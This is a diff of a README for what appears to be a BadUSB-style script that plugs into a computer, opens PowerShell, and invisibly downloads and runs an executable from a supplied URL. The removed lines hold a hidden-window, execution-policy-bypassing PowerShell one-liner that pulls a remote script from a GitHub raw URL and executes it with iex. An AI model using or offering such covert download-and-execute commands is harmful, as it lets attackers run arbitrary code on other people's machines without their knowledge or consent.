@@ -26,8 +26,3 @@ This script invisibly downloads an exe from an url that you will have to provide
 * Plug in your device
 * Opens a powershell
 * Execute command to download exe, and execute it 
-
-All
-```powershell
-powershell -w h -ep bypass -Command  "iex (iwr -uri 'https://raw.githubusercontent.com/Zenin0/Glipper_Scripts/main/Windows/CloseAllApps/closeAllApps.ps1').Content"
-```
